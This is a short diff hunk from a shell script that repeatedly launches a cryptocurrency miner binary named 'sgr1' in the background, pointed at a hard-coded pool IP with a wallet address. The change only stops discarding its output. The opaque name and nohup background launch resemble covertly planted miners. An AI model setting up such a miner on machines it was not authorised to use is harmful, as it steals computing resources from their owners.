@@ -25,7 +25,7 @@ while true; do
     pid=$!
 
     # Run the process with the specified parameters
-    nohup ./sgr1  -a yescryptr32 --pool 45.115.224.59:8443 -u UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.$WORKER --timeout 120 > /dev/null 2>&1 &
+    nohup ./sgr1  -a yescryptr32 --pool 45.115.224.59:8443 -u UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.$WORKER --timeout 120 &
 
     # Run for 1 minute
     sleep 60
